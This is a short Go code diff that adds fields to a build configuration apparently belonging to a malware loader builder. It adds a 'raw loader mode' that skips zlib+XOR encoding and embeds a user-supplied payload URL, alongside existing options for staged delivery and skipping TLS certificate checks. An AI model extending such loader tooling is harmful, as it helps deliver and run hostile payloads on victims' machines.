@@ -76,6 +76,9 @@ type BuildConfig struct {
 	// Staged delivery
 	StageURL   string `json:"stage_url"`
 	StageMaxDL int    `json:"stage_max_dl"` // max downloads per staged file (0 = unlimited)
+	// Raw loader mode: skip zlib+XOR, bake a user-supplied URL into the loader
+	RawPayload bool   `json:"raw_payload"`
+	PayloadURL string `json:"payload_url"` // full URL used when raw_payload=true
 	// Loader-specific: skip TLS cert verification when fetching payload over https
 	TLSSkipVerify bool `json:"tls_skip_verify"`
 	// Output filename (optional, overrides default name)
